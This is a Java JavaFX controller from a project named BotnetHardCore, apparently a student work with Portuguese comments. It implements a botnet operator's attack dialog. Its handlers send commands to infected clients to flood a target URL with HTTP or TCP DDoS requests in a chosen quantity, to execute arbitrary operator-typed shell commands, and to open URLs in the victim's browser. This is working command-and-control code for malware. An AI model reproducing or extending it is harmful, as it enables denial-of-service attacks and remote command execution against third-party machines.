package br.com.server.controller;

import br.com.client.server.model.ClientTableRow;
import br.com.server.core.Server;
import builder.AttackBuilder;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.stage.Stage;
import model.GenericMessage;

/**
 * Project: BotnetHardCore
 * User: Jeferson Machado <jefersonmachado@univille.br>
 * Date: 24/07/2018
 * Time: 10:55
 */
public class ClientAttackDialogController {

    @FXML
    private Label clientName;
    @FXML
    private TextField TFUrl;
    @FXML
    private TextField TFCmd;
    @FXML
    private Slider sliderRequisitionQuantity;

    @FXML
    private RadioButton httpAttackRadio;
    @FXML
    private RadioButton tcpAttackRadio;

    private Stage mDialogStage;
    private ClientTableRow mClient;
    private Server mServer;
    private boolean okClicked = false;

    /**
     * Inicializa a classe controle. Este método é chamado automaticamente
     * apos o arquivo fxml ter sido carregado.
     */
    @FXML
    private void initialize() {
//        try {
//            mServer = new Server();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }

        httpAttackRadio.setOnMouseClicked(e -> tcpAttackRadio.setSelected(false));

        tcpAttackRadio.setOnMouseClicked(e -> httpAttackRadio.setSelected(false));

        TFUrl.setText("192.168.1.100");

    }

    /**
     * Define o palco deste dialog
     *
     * @param dialogStage
     */
    public void setmDialogStage(Stage dialogStage) {
        this.mDialogStage = dialogStage;
    }

    /**
     * Define o cliente a ser atacado no dialog
     *
     * @param client
     */
    public void setClient(ClientTableRow client) {
        this.mClient = client;
        if (mClient != null)
            clientName.setText(mClient.getName() + "/" + mClient.getIpAddress());
        else
            clientName.setText("Todos");
    }

    /**
     * Retorna true seo usuario clicar OK, caso contrario false.
     *
     * @return
     */
    public boolean isOkClicked() {
        return okClicked;
    }

    @FXML
    private void handleDDOSAttack() {
        if (isInputValidDDOS()) {
            okClicked = true;

            AttackBuilder.DDOSAttackBuilder ddosAttackBuilder = AttackBuilder.buildDDOSAttack()
                    .withUrl(TFUrl.getText())
                    .withQuantity((int) sliderRequisitionQuantity.getValue())
                    .clientShouldSendResponse(mClient != null);

            GenericMessage genericMessage;

            if (httpAttackRadio.isSelected()) {
                genericMessage = ddosAttackBuilder.buildHTTP();
            } else {
                genericMessage = ddosAttackBuilder.buildTCP();
            }

            mServer.send(genericMessage, mClient);
        }
    }

    @FXML
    private void handleCMD() {
        if (isInputValidCMD()) {
            okClicked = true;

            GenericMessage cmd = AttackBuilder.buildCommandLineExecuter()
                    .withCommand(TFCmd.getText())
                    .clientShouldSendResponse(mClient != null)
                    .build();

            mServer.send(cmd, mClient);
        }
    }

    @FXML
    private void handleOpenUrl() {
        if (isInputValidDDOS()) {
            okClicked = true;

            GenericMessage build = AttackBuilder.buildBrowserOpening()
                    .withURL(TFUrl.getText())
                    .clientShouldSendResponse(mClient != null)
                    .build();

            mServer.send(build, mClient);
        }
    }

    /**
     * Quando o usuario clica Cancel.
     */
    @FXML
    private void handleCancel() {
        mDialogStage.close();
    }

    /**
     * Valida a entrada do usuario nos campos de texto.
     *
     * @return true se a entrada é valida
     */
    private boolean isInputValidDDOS() {
        String errorMessage = "";

        if (TFUrl.getText() == null || TFUrl.getText().length() == 0) {
            errorMessage += "Url inválida!\n";
        }

        if (errorMessage.length() == 0) {
            return true;
        } else {
            //Mostra a mesnagem de erro.
            Alert alert = new Alert(Alert.AlertType.ERROR);
            alert.setTitle("Campos inválidos");
            alert.setHeaderText("Favor corrigir os campos inválidos");
            alert.setContentText(errorMessage);
            alert.showAndWait();

            return false;
        }
    }

    private boolean isInputValidCMD() {
        String errorMessage = "";

        if (TFCmd.getText() == null || TFCmd.getText().length() == 0) {
            errorMessage += "Url inválida!\n";
        }

        if (errorMessage.length() == 0) {
            return true;
        } else {
            //Mostra a mesnagem de erro.
            Alert alert = new Alert(Alert.AlertType.ERROR);
            alert.setTitle("Campos inválidos");
            alert.setHeaderText("Favor corrigir os campos inválidos");
            alert.setContentText(errorMessage);
            alert.showAndWait();

            return false;
        }
    }

    public void setServer(Server server) {
        this.mServer = server;
    }
}
